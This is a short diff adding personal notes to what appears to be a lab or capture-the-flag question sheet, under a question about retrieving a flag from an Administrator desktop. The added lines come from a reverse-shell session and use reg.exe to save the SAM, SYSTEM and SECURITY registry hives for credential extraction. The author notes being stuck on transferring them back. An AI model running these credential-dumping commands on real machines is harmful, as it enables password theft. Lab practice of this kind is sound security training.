@@ -42,6 +42,12 @@ Question 3 - Crack the account's password. Submit the cleartext value.
 
 
 Question 4 -  Submit the contents of the flag.txt file on the Administrator desktop on MS01
+1) ON REVERSE SHELL -> mkdir c:\tools
+2) cd C:\tools 
+3) reg.exe save hklm\sam C:\tools\sam.save
+reg.exe save hklm\system C:\tools\system.save
+reg.exe save hklm\security C:\tools\security.save
+4) this is where im stuck trying to transfer back to Host machine
 
 
 
